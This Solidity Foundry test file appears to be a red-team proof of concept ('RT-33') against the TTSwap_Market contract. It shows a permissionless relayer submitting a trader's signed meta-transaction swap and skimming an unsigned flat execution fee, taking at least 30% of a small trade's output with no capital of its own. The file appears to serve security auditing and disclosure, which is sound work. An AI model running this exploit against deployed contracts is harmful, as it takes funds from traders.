// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {console} from "forge-std/src/console.sol";
import {TTSwap_Market} from "src/TTSwap_Market.sol";
import {TTSwap_Market_Proxy} from "src/TTSwap_Market_Proxy.sol";
import {TTSwap_Token} from "src/TTSwap_Token.sol";
import {TTSwap_Token_Proxy} from "src/TTSwap_Token_Proxy.sol";
import {I_TTSwap_Market} from "src/interfaces/I_TTSwap_Market.sol";
import {I_TTSwap_Token} from "src/interfaces/I_TTSwap_Token.sol";
import {T_GoodKey} from "src/type/T_GoodKey.sol";
import {toTTSwapUINT256} from "src/libraries/L_TTSwapUINT256.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

/// @dev ERC20 with a no-op EIP-2612 `permit` so a relayer can pull `from`=trader
///      via the meta-tx (transfertype 2) path without the trader signing a token permit.
contract PermitERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    // EIP-2612 no-op: signature not checked (irrelevant to this red-team target).
    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external {}
}

// Mirror of L_Currency/T_GoodKey decode structs so the test can ABI-encode `data` correctly.
struct _TS_transferData {
    uint8 transfertype;
    bytes sigdata;
}

struct _TS_Permit {
    uint256 value;
    uint256 deadline;
    uint8 v;
    bytes32 r;
    bytes32 s;
}

/// @notice RT-33 — permissionless relayer skims the flat `executeFee` (5e10 output base units)
///         out of the trader's delivery. The fee is NOT part of the EIP-712 signed payload,
///         so the trader cannot bound it. Zero relayer capital, positive relayer profit.
contract RT_RelayerFeeSkim is Test {
    address dao = makeAddr("dao");
    address marketAdmin = makeAddr("marketAdmin");

    uint256 traderPk = 0xA11CE;
    address trader = vm.addr(0xA11CE);
    address relayer = makeAddr("relayer"); // the attacker

    PermitERC20 usdt; // input good (value good, price 1)
    PermitERC20 g2; // output good (price 1)
    I_TTSwap_Token tts;
    I_TTSwap_Market market;
    TTSwap_Market_Proxy marketProxy;

    bytes32 private constant _EIP712_DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    bytes32 private constant _BUYGOOD_TYPEHASH = keccak256(
        "buyGood(address _trader,address referral,uint256 _goodid1,uint256 _goodid2,uint256 _swapQuantity,bytes data,uint256 external_info,uint256 nonce)"
    );

    function setUp() public {
        usdt = new PermitERC20("USDT", "USDT");
        g2 = new PermitERC20("G2", "G2");

        TTSwap_Token tokenImpl = new TTSwap_Token(address(usdt));
        uint256 mainConfig = (uint256(1) << 255) | 10000;
        TTSwap_Token_Proxy tokenProxy =
            new TTSwap_Token_Proxy(dao, mainConfig, "TTSwap Token", "TTS", address(tokenImpl));
        tts = I_TTSwap_Token(address(tokenProxy));

        TTSwap_Market marketImpl = new TTSwap_Market(tts);
        marketProxy = new TTSwap_Market_Proxy(tts, address(marketImpl));
        market = I_TTSwap_Market(address(marketProxy));

        vm.startPrank(dao);
        tts.setMarketAdmin(marketAdmin, true);
        tts.setEnv(address(market));
        vm.stopPrank();

        // Seed two deep, price-1 pools.
        address lp = makeAddr("lp");
        usdt.mint(lp, 100_000 ether);
        g2.mint(lp, 100_000 ether);
        vm.startPrank(lp);
        usdt.approve(address(market), type(uint256).max);
        g2.approve(address(market), type(uint256).max);
        market.initGood(_erc20(address(usdt)), toTTSwapUINT256(1e18, 1e18), "", lp, "");
        market.initGood(_erc20(address(g2)), toTTSwapUINT256(1e18, 1e18), "", lp, "");
        vm.stopPrank();

        // NOTE: with default safeLineUpper=100 a fresh pool has Q==investQty, so ANY buy
        // input reverts(55). A functional DEX MUST widen upper -> this is mandatory prod config.
        _widenUpper(uint256(uint160(address(usdt))), 200);

        // Trader funds + approves market (relayer will pull via permit path).
        usdt.mint(trader, 1 ether);
        vm.prank(trader);
        usdt.approve(address(market), type(uint256).max);
    }

    function test_swapWorks_directTrader() public {
        uint256 inputAmt = 1e11;
        uint256 swapQuantity = toTTSwapUINT256(uint128(inputAmt), 0);
        vm.prank(trader);
        (uint256 c1, uint256 c2) = market.buyGood(
            _erc20(address(usdt)), _erc20(address(g2)), swapQuantity, address(0), "", trader, "", 0
        );
        console.log("direct c1.amount1:", uint128(c1));
        console.log("direct c2.amount1:", uint128(c2));
    }

    function test_RT33_relayer_skims_flat_executeFee() public {
        // A modest swap: trader sells 1e11 USDT for ~1e11 G2 at price 1.
        uint256 inputAmt = 1e11;
        uint256 swapQuantity = toTTSwapUINT256(uint128(inputAmt), 0); // min gross out = 0
        uint256 goodId1 = uint256(uint160(address(usdt)));
        uint256 goodId2 = uint256(uint160(address(g2)));
        address recipient = address(0); // -> defaults to trader on delivery
        uint256 externalInfo = 0;

        // transfertype 2 (EIP-2612 permit) so relayer (msg.sender) can pull from=trader.
        bytes memory permitBlob = _type2(inputAmt);

        // Trader signs the buyGood order. Note: NO fee / min-net field exists in the payload.
        bytes memory sig = _signBuyGood(goodId1, goodId2, swapQuantity, recipient, permitBlob, externalInfo);

        uint256 traderG2Before = g2.balanceOf(trader);
        uint256 relayerCapBefore = usdt.balanceOf(relayer) + g2.balanceOf(relayer);

        vm.prank(relayer);
        (, uint256 good2change) = market.buyGood(
            _erc20(address(usdt)),
            _erc20(address(g2)),
            swapQuantity,
            recipient,
            permitBlob,
            trader,
            sig,
            externalInfo
        );

        uint128 grossOut = uint128(good2change); // AMM gross output (amount1)
        uint256 traderReceived = g2.balanceOf(trader) - traderG2Before;
        uint256 relayerFee = grossOut - traderReceived; // skimmed to relayer commission

        // Relayer realizes the commission.
        uint256[] memory ids = new uint256[](1);
        ids[0] = goodId2;
        vm.prank(relayer);
        market.collectCommission(ids, relayer, "");
        uint256 relayerCapAfter = usdt.balanceOf(relayer) + g2.balanceOf(relayer);

        console.log("gross AMM output (G2 base units):", grossOut);
        console.log("trader actually received       :", traderReceived);
        console.log("relayer skim (executeFee)      :", relayerFee);
        console.log("relayer realized profit        :", relayerCapAfter - relayerCapBefore);

        // Attacker (relayer) profit > 0 with ZERO capital (input came from the trader).
        assertEq(relayerCapBefore, 0, "relayer fronted capital");
        assertGt(relayerFee, 0, "no fee skimmed");
        assertGt(relayerCapAfter - relayerCapBefore, 0, "relayer did not profit");
        // The flat 5e10 base-unit fee is a large fraction of this small trade.
        assertGe(relayerFee * 100 / grossOut, 30, "skim < 30% of output");
    }

    /* -------------------------------------------------------------- helpers */

    function _erc20(address t) internal pure returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: t, id: 0});
    }

    function _widenUpper(uint256 goodId, uint256 upper) internal {
        uint256 adminBits = (upper << 247) | (uint256(60) << 239) | (uint256(1) << 237);
        vm.prank(marketAdmin);
        market.modifyGoodByAdmin(goodId, adminBits, marketAdmin, "");
    }

    // S_transferData{ transfertype: 2, sigdata: abi.encode(S_Permit{value,deadline,v,r,s}) }
    // Must be encoded as the struct value (dynamic -> leading offset word).
    function _type2(uint256 value) internal pure returns (bytes memory) {
        bytes memory sigdata = abi.encode(_TS_Permit(value, type(uint256).max, uint8(27), bytes32(0), bytes32(0)));
        return abi.encode(_TS_transferData(uint8(2), sigdata));
    }

    function _domainSeparator() internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                _EIP712_DOMAIN_TYPEHASH,
                keccak256(bytes("TTSwap_Market")),
                keccak256(bytes("2.0.0")),
                block.chainid,
                address(market)
            )
        );
    }

    function _signBuyGood(
        uint256 goodId1,
        uint256 goodId2,
        uint256 swapQuantity,
        address recipient,
        bytes memory data,
        uint256 externalInfo
    ) internal view returns (bytes memory) {
        bytes32 structHash = keccak256(
            abi.encode(
                _BUYGOOD_TYPEHASH,
                trader,
                recipient,
                goodId1,
                goodId2,
                swapQuantity,
                keccak256(data),
                externalInfo,
                uint256(0) // nonces[trader] == 0
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(traderPk, digest);
        return abi.encodePacked(r, s, v);
    }
}
